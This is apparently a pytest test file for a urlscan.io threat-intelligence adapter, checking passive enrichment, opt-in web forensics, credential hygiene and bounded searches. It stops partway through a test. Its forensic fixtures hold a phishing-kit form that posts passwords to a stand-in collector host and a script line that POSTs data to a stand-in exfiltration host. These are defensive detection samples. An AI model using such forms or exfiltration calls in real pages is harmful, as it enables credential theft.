"""The urlscan adapter (Task 8).

Two things are under test: that ordinary enrichment stays cheap and passive, and
that deep forensic retrieval cannot happen unless it was explicitly asked for.
"""

from __future__ import annotations

from typing import Any

import pytest
from pydantic import SecretStr

from fixtures.urlscan import payloads
from fixtures.urlscan.fake_client import FakeUrlscanClient, FakeUrlscanClientFactory
from ti_recon.artifacts import ArtifactKind, ArtifactScope, InMemoryArtifactStore
from ti_recon.artifacts.store import ArtifactLimits
from ti_recon.credentials.enums import AuthType, CredentialStatus
from ti_recon.credentials.models import CredentialMaterial
from ti_recon.enums import (
    ActivityMode,
    IntelObjectType,
    InvestigationDepth,
    ObjectClass,
    ProviderCapability,
    ProviderErrorCategory,
    ProviderOperation,
    ProviderRunStatus,
)
from ti_recon.execution.clock import ManualClock
from ti_recon.execution.limits import InMemoryQuotaStore
from ti_recon.execution.models import ExecutionScope
from ti_recon.models.intel_object import IntelObject
from ti_recon.providers.capabilities import ProviderHealth
from ti_recon.providers.errors import (
    ProviderAuthenticationError,
    ProviderInvalidRequestError,
    ProviderRateLimitedError,
    ProviderTransientError,
    UnsupportedProviderOperation,
)
from ti_recon.providers.request import ProviderRequest
from ti_recon.providers.transport import ProviderTransportSecurityError
from ti_recon.providers.urlscan.adapter import (
    URLSCAN_ARTIFACTS_UNAVAILABLE,
    URLSCAN_FORENSICS_NOT_REQUESTED,
    URLSCAN_HISTORICAL_RANGE_UNKNOWN,
    URLSCAN_NOT_SEARCHABLE,
    URLSCAN_SCAN_UNRETRIEVABLE,
    UrlscanAdapter,
)
from ti_recon.providers.urlscan.client import UrlscanArtifact, UrlscanHttpClient
from ti_recon.providers.urlscan.config import UrlscanConfig
from ti_recon.providers.urlscan.policy import UrlscanLookupPolicy
from ti_recon.providers.urlscan.search import SearchLimits

USER = "user-a"
INVESTIGATION = "inv-1"
PNG = UrlscanArtifact(content=b"\x89PNG" + b"x" * 40, content_type="image/png", truncated=False)
DOM = UrlscanArtifact(
    content=b"<html><body>login form</body></html>", content_type="text/html", truncated=False
)


def credential() -> CredentialMaterial:
    return CredentialMaterial(
        connection_id="conn-1",
        user_id=USER,
        provider_id="urlscan",
        credential_group="urlscan",
        auth_type=AuthType.API_KEY,
        secret=SecretStr("urlscan-key-SHOULD-NOT-LEAK-12345"),
    )


def observable(
    object_type: IntelObjectType = IntelObjectType.DOMAIN_NAME,
    value: str = "login.evil.example",
    properties: dict[str, Any] | None = None,
) -> IntelObject:
    return IntelObject(
        object_class=ObjectClass.OBSERVABLE,
        object_type=object_type,
        canonical_value=value,
        display_value=value,
        properties=properties or {},
    )


def make_request(
    *,
    depth: InvestigationDepth = InvestigationDepth.STANDARD,
    capabilities: frozenset[ProviderCapability] = frozenset({ProviderCapability.REPUTATION}),
    intel_object: IntelObject | None = None,
    operation: ProviderOperation = ProviderOperation.LOOKUP,
    activity_mode: ActivityMode = ActivityMode.PASSIVE,
) -> ProviderRequest:
    return ProviderRequest(
        investigation_id=INVESTIGATION,
        intel_object=intel_object or observable(),
        operation=operation,
        requested_capabilities=capabilities,
        depth=depth,
        activity_mode=activity_mode,
    )


def make_adapter(
    client: FakeUrlscanClient | None = None,
    *,
    artifact_store: InMemoryArtifactStore | None = None,
    lookup_policy: UrlscanLookupPolicy | None = None,
) -> tuple[UrlscanAdapter, FakeUrlscanClient]:
    fake = client or FakeUrlscanClient()
    adapter = UrlscanAdapter(
        client_factory=FakeUrlscanClientFactory(fake),  # type: ignore[arg-type]
        artifact_store=artifact_store,
        lookup_policy=lookup_policy,
        clock=ManualClock(),
    )
    return adapter, fake


FORENSIC_CAPABILITIES = frozenset({ProviderCapability.REPUTATION, ProviderCapability.WEB_FORENSICS})


# --------------------------------------------------------------------------- #
# Enrichment stays cheap and passive
# --------------------------------------------------------------------------- #


async def test_a_normal_lookup_searches_then_reads_stored_scans() -> None:
    adapter, fake = make_adapter()
    envelope = await adapter.lookup(make_request(), credential())
    assert envelope.status is ProviderRunStatus.SUCCESS
    assert fake.called("search")
    assert fake.called("result")
    assert envelope.evidence


async def test_a_normal_lookup_retrieves_no_page_content() -> None:
    """The whole point of the two modes: enrichment never pulls artifacts."""
    adapter, fake = make_adapter(artifact_store=InMemoryArtifactStore())
    await adapter.lookup(make_request(), credential())
    assert not fake.called("screenshot")
    assert not fake.called("dom")
    assert not fake.called("response_body")


async def test_a_deep_lookup_without_the_capability_still_retrieves_nothing() -> None:
    """Depth alone is not consent; the analyst asked for reputation."""
    adapter, fake = make_adapter(artifact_store=InMemoryArtifactStore())
    await adapter.lookup(make_request(depth=InvestigationDepth.DEEP), credential())
    assert not fake.called("dom")
    assert not fake.called("screenshot")


async def test_the_capability_without_deep_depth_retrieves_nothing() -> None:
    """And the capability alone is not the cost signal either."""
    adapter, fake = make_adapter(artifact_store=InMemoryArtifactStore())
    envelope = await adapter.lookup(
        make_request(depth=InvestigationDepth.STANDARD, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    assert not fake.called("dom")
    assert URLSCAN_FORENSICS_NOT_REQUESTED in envelope.warnings


async def test_depth_bounds_how_many_scans_are_read() -> None:
    scans = [f"0195f3c2-4d6e-7a8b-9c0d-1e2f3a4b5c{index:02d}" for index in range(1, 9)]
    fake = FakeUrlscanClient(
        search_payload=payloads.search_payload(*scans),
        result_payloads={scan: payloads.result_payload() for scan in scans},
    )
    adapter, _ = make_adapter(fake)
    await adapter.lookup(make_request(depth=InvestigationDepth.QUICK), credential())
    quick_calls = fake.call_count("result")

    fake.calls.clear()
    await adapter.lookup(make_request(depth=InvestigationDepth.DEEP), credential())
    deep_calls = fake.call_count("result")
    assert quick_calls == 1
    assert deep_calls > quick_calls


async def test_the_client_is_closed_even_when_a_lookup_fails() -> None:
    fake = FakeUrlscanClient()
    fake.fail("search", ProviderRateLimitedError("urlscan"))
    adapter, _ = make_adapter(fake)
    with pytest.raises(ProviderRateLimitedError):
        await adapter.lookup(make_request(), credential())
    assert fake.closed is True


# --------------------------------------------------------------------------- #
# Nothing active, ever
# --------------------------------------------------------------------------- #


async def test_active_actions_are_unsupported() -> None:
    adapter, fake = make_adapter()
    with pytest.raises(UnsupportedProviderOperation):
        await adapter.active_action(make_request(), credential())
    assert fake.calls == []


async def test_a_lookup_in_active_mode_is_refused() -> None:
    """A caller bypassing the executor still cannot make this integration active."""
    adapter, fake = make_adapter()
    request = make_request(
        activity_mode=ActivityMode.ACTIVE, operation=ProviderOperation.ACTIVE_ACTION
    )
    with pytest.raises(UnsupportedProviderOperation):
        await adapter.lookup(request, credential())
    assert fake.calls == []


async def test_batch_and_pivot_are_unsupported_rather_than_broken() -> None:
    adapter, _ = make_adapter()
    with pytest.raises(UnsupportedProviderOperation):
        await adapter.batch_lookup([make_request()], credential())
    with pytest.raises(UnsupportedProviderOperation):
        await adapter.pivot(make_request(), credential())


async def test_the_descriptor_never_claims_active_support() -> None:
    adapter, _ = make_adapter()
    assert adapter.descriptor.supports_active is False


async def test_a_lookup_without_a_credential_is_refused() -> None:
    adapter, fake = make_adapter()
    with pytest.raises(ProviderInvalidRequestError):
        await adapter.lookup(make_request(), None)
    assert fake.calls == []


# --------------------------------------------------------------------------- #
# Coverage gaps are reported, never disguised as absence
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("algorithm", "digest"),
    [("MD5", "c" * 32), ("SHA-1", "d" * 40)],
)
async def test_a_hash_urlscan_cannot_search_is_unsupported_not_empty(
    algorithm: str, digest: str
) -> None:
    """NO_DATA would let a blind spot read as a clean result."""
    adapter, fake = make_adapter()
    envelope = await adapter.lookup(
        make_request(
            intel_object=observable(IntelObjectType.FILE, digest, {"hashes": {algorithm: digest}})
        ),
        credential(),
    )
    assert envelope.status is ProviderRunStatus.NOT_SUPPORTED
    assert envelope.status is not ProviderRunStatus.NO_DATA
    assert URLSCAN_NOT_SEARCHABLE in envelope.warnings
    assert envelope.error_message is not None
    assert "SHA-256" in envelope.error_message
    assert fake.calls == []


async def test_a_sha256_file_is_searched_normally() -> None:
    digest = "a" * 64
    adapter, fake = make_adapter()
    envelope = await adapter.lookup(
        make_request(
            intel_object=observable(IntelObjectType.FILE, digest, {"hashes": {"SHA-256": digest}})
        ),
        credential(),
    )
    assert fake.called("search")
    assert envelope.status is not ProviderRunStatus.NOT_SUPPORTED


async def test_a_file_with_a_sha256_alongside_weaker_hashes_is_searched() -> None:
    digest = "a" * 64
    adapter, fake = make_adapter()
    await adapter.lookup(
        make_request(
            intel_object=observable(
                IntelObjectType.FILE,
                digest,
                {"hashes": {"SHA-256": digest, "MD5": "c" * 32}},
            )
        ),
        credential(),
    )
    assert fake.called("search")


async def test_a_searched_sha256_with_no_hits_is_no_data_not_unsupported() -> None:
    """The distinction the two statuses exist to make."""
    digest = "a" * 64
    adapter, fake = make_adapter(FakeUrlscanClient(search_payload={"results": []}))
    envelope = await adapter.lookup(
        make_request(
            intel_object=observable(IntelObjectType.FILE, digest, {"hashes": {"SHA-256": digest}})
        ),
        credential(),
    )
    assert fake.called("search")
    assert envelope.status is ProviderRunStatus.NO_DATA
    assert URLSCAN_NOT_SEARCHABLE not in envelope.warnings


async def test_no_scans_at_all_is_no_data_not_a_failure() -> None:
    adapter, _ = make_adapter(FakeUrlscanClient(search_payload={"results": []}))
    envelope = await adapter.lookup(make_request(), credential())
    assert envelope.status is ProviderRunStatus.NO_DATA
    assert envelope.error_category is None
    # Nothing was found, but how far back we looked is still worth recording:
    # it is the difference between a clean result and a narrow one.
    assert [item.claim_type for item in envelope.evidence] == ["urlscan_search_coverage"]
    assert envelope.evidence[0].attributes["candidates_selected"] == 0


async def test_a_scan_that_cannot_be_retrieved_degrades_rather_than_fails() -> None:
    scans = [payloads.SCAN_ID, payloads.SECOND_SCAN_ID]
    fake = FakeUrlscanClient(
        search_payload=payloads.search_payload(*scans),
        # The second scan is private to another team, so it is simply absent.
        result_payloads={payloads.SCAN_ID: payloads.result_payload()},
    )
    adapter, _ = make_adapter(fake)
    envelope = await adapter.lookup(make_request(), credential())
    assert envelope.status is ProviderRunStatus.PARTIAL
    assert URLSCAN_SCAN_UNRETRIEVABLE in envelope.warnings
    assert envelope.evidence


# --------------------------------------------------------------------------- #
# Web forensics, when explicitly requested
# --------------------------------------------------------------------------- #


async def test_deep_plus_the_capability_retrieves_stored_artifacts() -> None:
    store = InMemoryArtifactStore()
    fake = FakeUrlscanClient(screenshot=PNG, dom=DOM)
    adapter, _ = make_adapter(fake, artifact_store=store)
    envelope = await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    assert fake.called("screenshot")
    assert fake.called("dom")
    scope = ArtifactScope(user_id=USER, investigation_id=INVESTIGATION)
    kinds = {artifact.kind for artifact in store.list(scope)}
    assert kinds == {ArtifactKind.SCREENSHOT, ArtifactKind.DOM}
    assert envelope.status is ProviderRunStatus.SUCCESS


async def test_a_captured_artifact_is_recorded_without_its_content() -> None:
    store = InMemoryArtifactStore()
    adapter, _ = make_adapter(FakeUrlscanClient(screenshot=PNG, dom=DOM), artifact_store=store)
    envelope = await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    captured = [item for item in envelope.evidence if item.claim_type == "urlscan_stored_artifact"]
    assert len(captured) == 2
    for item in captured:
        assert item.effect.value == "context_only"
        assert "content" not in item.attributes
        assert "login form" not in repr(item.attributes)
        assert len(item.attributes["sha256"]) == 64


async def test_artifacts_are_scoped_to_the_analyst_who_ran_the_lookup() -> None:
    store = InMemoryArtifactStore()
    adapter, _ = make_adapter(FakeUrlscanClient(dom=DOM), artifact_store=store)
    await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    mine = ArtifactScope(user_id=USER, investigation_id=INVESTIGATION)
    theirs = ArtifactScope(user_id="user-b", investigation_id=INVESTIGATION)
    assert store.list(mine)
    assert store.list(theirs) == ()


async def test_only_the_newest_scan_is_captured() -> None:
    scans = [payloads.SCAN_ID, payloads.SECOND_SCAN_ID]
    fake = FakeUrlscanClient(
        search_payload=payloads.search_payload(*scans),
        result_payloads={scan: payloads.result_payload() for scan in scans},
        dom=DOM,
    )
    adapter, _ = make_adapter(fake, artifact_store=InMemoryArtifactStore())
    await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    assert fake.call_count("dom") == 1


async def test_an_operator_can_switch_forensics_off_entirely() -> None:
    """An operator's decision outranks a caller's request."""
    fake = FakeUrlscanClient(screenshot=PNG, dom=DOM)
    adapter, _ = make_adapter(
        fake,
        artifact_store=InMemoryArtifactStore(),
        lookup_policy=UrlscanLookupPolicy(allow_web_forensics=False),
    )
    envelope = await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    assert not fake.called("dom")
    assert URLSCAN_FORENSICS_NOT_REQUESTED in envelope.warnings


async def test_a_disabled_forensics_deployment_says_so_in_its_capabilities() -> None:
    adapter, _ = make_adapter(lookup_policy=UrlscanLookupPolicy(allow_web_forensics=False))
    discovered = await adapter.discover_capabilities(credential())
    assert ProviderCapability.WEB_FORENSICS not in discovered.capabilities


async def test_a_policy_can_permit_only_some_artifact_kinds() -> None:
    fake = FakeUrlscanClient(screenshot=PNG, dom=DOM)
    adapter, _ = make_adapter(
        fake,
        artifact_store=InMemoryArtifactStore(),
        lookup_policy=UrlscanLookupPolicy(forensic_artifacts=frozenset({ArtifactKind.DOM})),
    )
    await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    assert fake.called("dom")
    assert not fake.called("screenshot")


async def test_forensics_without_anywhere_to_store_fetches_nothing() -> None:
    """Nowhere to put page content is a reason not to fetch it."""
    fake = FakeUrlscanClient(screenshot=PNG, dom=DOM)
    adapter, _ = make_adapter(fake, artifact_store=None)
    envelope = await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    assert not fake.called("dom")
    assert URLSCAN_ARTIFACTS_UNAVAILABLE in envelope.warnings


async def test_a_scan_with_no_stored_artifacts_is_reported_not_failed() -> None:
    adapter, _ = make_adapter(FakeUrlscanClient(), artifact_store=InMemoryArtifactStore())
    envelope = await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    assert URLSCAN_ARTIFACTS_UNAVAILABLE in envelope.warnings
    assert envelope.evidence


async def test_an_artifact_that_does_not_fit_the_budget_does_not_fail_the_lookup() -> None:
    """Real findings are not traded for a picture."""
    store = InMemoryArtifactStore(ArtifactLimits(max_artifact_bytes=1))
    adapter, _ = make_adapter(FakeUrlscanClient(screenshot=PNG, dom=DOM), artifact_store=store)
    envelope = await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    assert store.list(ArtifactScope(user_id=USER, investigation_id=INVESTIGATION)) == ()
    assert envelope.evidence
    assert URLSCAN_ARTIFACTS_UNAVAILABLE in envelope.warnings


async def test_an_empty_artifact_is_treated_as_absent() -> None:
    empty = UrlscanArtifact(content=b"", content_type="image/png", truncated=False)
    adapter, _ = make_adapter(
        FakeUrlscanClient(screenshot=empty, dom=DOM), artifact_store=InMemoryArtifactStore()
    )
    envelope = await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    captured = [item for item in envelope.evidence if item.claim_type == "urlscan_stored_artifact"]
    assert [item.attributes["kind"] for item in captured] == ["dom"]


async def test_a_truncated_artifact_is_flagged_rather_than_trusted() -> None:
    big = UrlscanArtifact(content=b"x" * 64, content_type="text/html", truncated=True)
    store = InMemoryArtifactStore()
    adapter, _ = make_adapter(FakeUrlscanClient(dom=big), artifact_store=store)
    envelope = await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )
    captured = next(
        item for item in envelope.evidence if item.claim_type == "urlscan_stored_artifact"
    )
    assert captured.attributes["truncated"] is True
    stored = store.list(ArtifactScope(user_id=USER, investigation_id=INVESTIGATION))[0]
    assert stored.is_usable is False


# --------------------------------------------------------------------------- #
# Credentials, quota, health
# --------------------------------------------------------------------------- #


async def test_a_working_key_validates_against_the_quota_endpoint() -> None:
    adapter, fake = make_adapter()
    validation = await adapter.validate_credentials(credential())
    assert validation.status is CredentialStatus.ACTIVE
    assert fake.called("quotas")
    assert not fake.called("search")


async def test_a_rejected_key_is_reported_invalid() -> None:
    fake = FakeUrlscanClient()
    fake.fail("quotas", ProviderAuthenticationError("urlscan"))
    adapter, _ = make_adapter(fake)
    validation = await adapter.validate_credentials(credential())
    assert validation.status is CredentialStatus.INVALID


async def test_a_provider_outage_never_invalidates_a_good_key() -> None:
    fake = FakeUrlscanClient()
    fake.fail("quotas", ProviderTransientError("urlscan"))
    adapter, _ = make_adapter(fake)
    validation = await adapter.validate_credentials(credential())
    assert validation.status is CredentialStatus.UNKNOWN
    assert validation.is_usable is True


async def test_a_missing_credential_is_invalid_without_a_call() -> None:
    adapter, fake = make_adapter()
    validation = await adapter.validate_credentials(None)
    assert validation.status is CredentialStatus.INVALID
    assert fake.calls == []


async def test_health_is_unknown_without_a_credential() -> None:
    adapter, fake = make_adapter()
    report = await adapter.health(None)
    assert report.health is ProviderHealth.UNKNOWN
    assert fake.calls == []


async def test_health_is_available_when_the_quota_endpoint_answers() -> None:
    adapter, _ = make_adapter()
    assert (await adapter.health(credential())).health is ProviderHealth.AVAILABLE


@pytest.mark.parametrize(
    ("error", "expected"),
    [
        (ProviderTransientError("urlscan"), ProviderHealth.UNAVAILABLE),
        (ProviderAuthenticationError("urlscan"), ProviderHealth.DEGRADED),
    ],
)
async def test_health_distinguishes_an_outage_from_a_refusal(
    error: Exception, expected: ProviderHealth
) -> None:
    fake = FakeUrlscanClient()
    fake.fail("quotas", error)  # type: ignore[arg-type]
    adapter, _ = make_adapter(fake)
    assert (await adapter.health(credential())).health is expected


async def test_quota_is_read_and_only_read_actions_can_gate() -> None:
    adapter, _ = make_adapter()
    reading = await adapter.fetch_quota(credential())
    assert reading.is_exhausted is False
    assert {bucket.name for bucket in reading.snapshot.buckets} == {
        "search_day",
        "search_minute",
        "retrieve_day",
    }


async def test_a_failed_quota_refresh_does_not_fail_the_lookup() -> None:
    """Quota is context; losing it must not lose the findings."""
    fake = FakeUrlscanClient()
    fake.fail("quotas", ProviderRateLimitedError("urlscan"))
    adapter, _ = make_adapter(fake)
    envelope = await adapter.lookup(make_request(), credential())
    assert envelope.status is ProviderRunStatus.SUCCESS
    assert envelope.quota is None


async def test_rate_limit_headers_reach_the_envelope() -> None:
    fake = FakeUrlscanClient(
        rate_limit_headers={
            "X-Rate-Limit-Limit": "100",
            "X-Rate-Limit-Remaining": "97",
            "X-Rate-Limit-Scope": "minute",
        }
    )
    adapter, _ = make_adapter(fake)
    envelope = await adapter.lookup(make_request(), credential())
    assert envelope.rate_limit is not None
    assert envelope.rate_limit.remaining == 97


# --------------------------------------------------------------------------- #
# Contract helpers
# --------------------------------------------------------------------------- #


def test_normalization_is_pure_and_needs_no_client() -> None:
    adapter = UrlscanAdapter(clock=ManualClock())
    payload = adapter.normalize(make_request(), payloads.result_payload())
    assert payload.evidence
    assert payload.objects


@pytest.mark.parametrize(
    ("error", "expected"),
    [
        (ProviderRateLimitedError("urlscan"), ProviderErrorCategory.RATE_LIMITED),
        (ProviderAuthenticationError("urlscan"), ProviderErrorCategory.AUTHENTICATION_ERROR),
        (TimeoutError(), ProviderErrorCategory.TRANSIENT_ERROR),
        (RuntimeError("boom"), ProviderErrorCategory.UNKNOWN_ERROR),
    ],
)
def test_errors_are_classified_into_normalized_categories(
    error: Exception, expected: ProviderErrorCategory
) -> None:
    adapter, _ = make_adapter()
    assert adapter.classify_error(error) is expected


def test_refusing_to_leave_the_host_is_our_decision_not_a_provider_failure() -> None:
    adapter, _ = make_adapter()
    error = ProviderTransportSecurityError("urlscan", message="off-host redirect")
    assert adapter.classify_error(error) is ProviderErrorCategory.INVALID_REQUEST


def test_rate_limits_are_parsed_from_headers() -> None:
    adapter, _ = make_adapter()
    snapshot = adapter.parse_rate_limits({"X-Rate-Limit-Remaining": "5"})
    assert snapshot is not None
    assert snapshot.remaining == 5


def test_an_adapter_repr_carries_no_credential() -> None:
    adapter, _ = make_adapter()
    assert "urlscan" in repr(adapter)
    assert "SHOULD-NOT-LEAK" not in repr(adapter)


# --------------------------------------------------------------------------- #
# Quota sharing with the execution layer
# --------------------------------------------------------------------------- #


async def test_a_fresh_quota_reading_is_not_re_fetched() -> None:
    """The executor's pre-check and this refresh address the same entry."""
    clock = ManualClock()
    quota_store = InMemoryQuotaStore(clock=clock)
    fake = FakeUrlscanClient()
    adapter = UrlscanAdapter(
        client_factory=FakeUrlscanClientFactory(fake),  # type: ignore[arg-type]
        quota_store=quota_store,
        clock=clock,
    )
    await adapter.lookup(make_request(), credential())
    assert fake.call_count("quotas") == 1

    fake.calls.clear()
    await adapter.lookup(make_request(), credential())
    assert fake.call_count("quotas") == 0


async def test_a_refreshed_reading_is_shared_with_the_execution_layer() -> None:
    clock = ManualClock()
    quota_store = InMemoryQuotaStore(clock=clock)
    adapter = UrlscanAdapter(
        client_factory=FakeUrlscanClientFactory(FakeUrlscanClient()),  # type: ignore[arg-type]
        quota_store=quota_store,
        clock=clock,
    )
    envelope = await adapter.lookup(make_request(), credential())
    assert envelope.quota is not None
    scope = ExecutionScope.for_user(
        provider_id="urlscan", user_id=USER, provider_connection_id="conn-1"
    )
    assert await quota_store.get(scope.identity) is not None


async def test_quota_refresh_can_be_switched_off_entirely() -> None:
    fake = FakeUrlscanClient()
    adapter, _ = make_adapter(
        fake, lookup_policy=UrlscanLookupPolicy(refresh_quota_on_lookup=False)
    )
    envelope = await adapter.lookup(make_request(), credential())
    assert not fake.called("quotas")
    assert envelope.quota is None


# --------------------------------------------------------------------------- #
# Construction
# --------------------------------------------------------------------------- #


def test_a_default_adapter_builds_a_host_pinned_client() -> None:
    adapter = UrlscanAdapter()
    client = adapter._client_factory()
    assert isinstance(client, UrlscanHttpClient)
    assert client.config.host == "https://urlscan.io"


def test_configuration_and_policy_are_exposed_for_inspection() -> None:
    policy = UrlscanLookupPolicy(max_response_bodies=2)
    adapter = UrlscanAdapter(config=UrlscanConfig(timeout_seconds=11), lookup_policy=policy)
    assert adapter.config.timeout_seconds == 11
    assert adapter.lookup_policy is policy


# --------------------------------------------------------------------------- #
# Forensic extraction from what was captured
# --------------------------------------------------------------------------- #

DOM_ARTIFACT = UrlscanArtifact(
    content=b"<html><body>page</body></html>", content_type="text/html", truncated=False
)

KIT_DOM = UrlscanArtifact(
    content=(
        b"<html><title>Sign in</title>"
        b'<form action="https://collector.evil.example/collect.php">'
        b'<input type="password" name="passwd"></form>'
        b'<script>var t = "123456789:AAFAKEfakeFAKEfakeFAKEfakeFAKEfake01";</script></html>'
    ),
    content_type="text/html",
    truncated=False,
)
SCRIPT_BODY = UrlscanArtifact(
    content=b'fetch("https://exfil.evil.example/drop", {method: "POST"})',
    content_type="text/javascript",
    truncated=False,
)


def forensic_adapter(
    fake: FakeUrlscanClient, **policy: Any
) -> tuple[UrlscanAdapter, InMemoryArtifactStore]:
    store = InMemoryArtifactStore()
    adapter, _ = make_adapter(
        fake,
        artifact_store=store,
        lookup_policy=UrlscanLookupPolicy(**policy) if policy else None,
    )
    return adapter, store


async def run_forensics(adapter: UrlscanAdapter) -> Any:
    return await adapter.lookup(
        make_request(depth=InvestigationDepth.DEEP, capabilities=FORENSIC_CAPABILITIES),
        credential(),
    )


async def test_a_captured_dom_is_statically_analysed() -> None:
    adapter, _ = forensic_adapter(FakeUrlscanClient(dom=KIT_DOM))
    envelope = await run_forensics(adapter)
    findings = next(
        item for item in envelope.evidence if item.claim_type == "urlscan_page_forensics"
    )
    assert findings.attributes["has_masked_input"] is True
    assert "https://collector.evil.example/collect.php" in findings.attributes["form_actions"]
    assert "telegram.bot-token" in findings.attributes["sensitive_identifier_types"]


async def test_no_extracted_secret_reaches_the_envelope() -> None:
    adapter, _ = forensic_adapter(FakeUrlscanClient(dom=KIT_DOM))
    envelope = await run_forensics(adapter)
    dumped = repr(envelope.model_dump(mode="json"))
    assert "AAFAKEfake" not in dumped
    assert "123456789:" not in dumped


async def test_a_captured_dom_is_fingerprinted_for_pivoting() -> None:
    adapter, _ = forensic_adapter(FakeUrlscanClient(dom=KIT_DOM))
    envelope = await run_forensics(adapter)
    fingerprints = next(
        item for item in envelope.evidence if item.claim_type == "urlscan_page_fingerprints"
    )
    assert len(fingerprints.attributes["dom_structure"]) == 64
    assert len(fingerprints.attributes["form_targets"]) == 64


async def test_textual_response_bodies_are_retrieved_and_analysed() -> None:
    digest = "a" * 64
    payload = payloads.result_payload()
    payload["data"]["requests"] = [
        {"response": {"response": {"hash": digest, "mimeType": "text/javascript"}}},
        {"response": {"response": {"hash": "b" * 64, "mimeType": "image/png"}}},
    ]
    fake = FakeUrlscanClient(
        result_payloads={payloads.SCAN_ID: payload}, response_bodies={digest: SCRIPT_BODY}
    )
    adapter, store = forensic_adapter(fake)
    envelope = await run_forensics(adapter)
    assert fake.call_count("response_body") == 1
    body_findings = next(
        item for item in envelope.evidence if item.claim_type == "urlscan_response_forensics"
    )
    assert body_findings.attributes["referenced_hosts"] == ["exfil.evil.example"]
    kinds = {
        artifact.kind
        for artifact in store.list(ArtifactScope(user_id=USER, investigation_id=INVESTIGATION))
    }
    assert ArtifactKind.RESPONSE_BODY in kinds


async def test_response_body_retrieval_respects_its_budget() -> None:
    digests = [f"{index:064x}" for index in range(10)]
    payload = payloads.result_payload()
    payload["data"]["requests"] = [
        {"response": {"response": {"hash": digest, "mimeType": "text/javascript"}}}
        for digest in digests
    ]
    fake = FakeUrlscanClient(
        result_payloads={payloads.SCAN_ID: payload},
        response_bodies=dict.fromkeys(digests, SCRIPT_BODY),
    )
    adapter, _ = forensic_adapter(fake, max_response_bodies=2)
    await run_forensics(adapter)
    assert fake.call_count("response_body") == 2


async def test_response_bodies_can_be_switched_off_on_their_own() -> None:
    digest = "a" * 64
    payload = payloads.result_payload()
    payload["data"]["requests"] = [
        {"response": {"response": {"hash": digest, "mimeType": "text/javascript"}}}
    ]
    fake = FakeUrlscanClient(
        result_payloads={payloads.SCAN_ID: payload}, response_bodies={digest: SCRIPT_BODY}
    )
    adapter, _ = forensic_adapter(
        fake, forensic_artifacts=frozenset({ArtifactKind.DOM, ArtifactKind.SCREENSHOT})
    )
    await run_forensics(adapter)
    assert not fake.called("response_body")


async def test_a_body_urlscan_no_longer_holds_is_skipped() -> None:
    digest = "a" * 64
    payload = payloads.result_payload()
    payload["data"]["requests"] = [
        {"response": {"response": {"hash": digest, "mimeType": "text/javascript"}}}
    ]
    fake = FakeUrlscanClient(result_payloads={payloads.SCAN_ID: payload}, dom=KIT_DOM)
    adapter, _ = forensic_adapter(fake)
    envelope = await run_forensics(adapter)
    assert fake.called("response_body")
    assert not any(item.claim_type == "urlscan_response_forensics" for item in envelope.evidence)


async def test_a_screenshot_is_stored_but_never_parsed() -> None:
    """There is nothing this system would trust itself to extract from pixels."""
    adapter, _ = forensic_adapter(FakeUrlscanClient(screenshot=PNG))
    envelope = await run_forensics(adapter)
    assert any(item.claim_type == "urlscan_stored_artifact" for item in envelope.evidence)
    assert not any(item.claim_type == "urlscan_page_forensics" for item in envelope.evidence)


# --------------------------------------------------------------------------- #
# Every search is date bounded
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("depth", list(InvestigationDepth))
async def test_no_lookup_at_any_depth_issues_an_unbounded_query(
    depth: InvestigationDepth,
) -> None:
    adapter, fake = make_adapter()
    await adapter.lookup(make_request(depth=depth), credential())
    query = next(detail for name, detail in fake.calls if name == "search")
    assert " AND date:>now-" in query


def quotas_allowing(months: int | None) -> dict[str, Any]:
    payload = payloads.quotas_payload()
    if months is not None:
        payload["maxSearchRangeMonths"] = months
    return payload


async def search_query(
    depth: InvestigationDepth,
    *,
    months: int | None = None,
    capabilities: frozenset[ProviderCapability] = frozenset({ProviderCapability.REPUTATION}),
) -> str:
    fake = FakeUrlscanClient(quotas_payload=quotas_allowing(months), dom=DOM_ARTIFACT)
    adapter, _ = make_adapter(fake, artifact_store=InMemoryArtifactStore())
    await adapter.lookup(make_request(depth=depth, capabilities=capabilities), credential())
    return next(detail for name, detail in fake.calls if name == "search")


async def test_quick_and_standard_keep_their_windows_on_a_generous_account() -> None:
    """A ten-year entitlement does not turn a triage lookup into a history sweep."""
    assert (await search_query(InvestigationDepth.QUICK, months=120)).endswith("date:>now-30d")
    assert (await search_query(InvestigationDepth.STANDARD, months=120)).endswith("date:>now-180d")


async def test_deep_reaches_as_far_back_as_the_account_permits() -> None:
    """The point of the change: a 2022 kit is what identifies the 2026 one."""
    assert (await search_query(InvestigationDepth.DEEP, months=48)).endswith("date:>now-1461d")
    assert (await search_query(InvestigationDepth.DEEP, months=120)).endswith("date:>now-3652d")


async def test_deep_narrows_to_a_small_entitlement() -> None:
    assert (await search_query(InvestigationDepth.DEEP, months=6)).endswith("date:>now-181d")


async def test_an_account_narrower_than_standard_clamps_it() -> None:
    assert (await search_query(InvestigationDepth.STANDARD, months=3)).endswith("date:>now-92d")


async def test_deep_falls_back_to_a_finite_year_without_account_metadata() -> None:
    assert (await search_query(InvestigationDepth.DEEP)).endswith("date:>now-365d")


@pytest.mark.parametrize("months", [0, -12, "many", None])
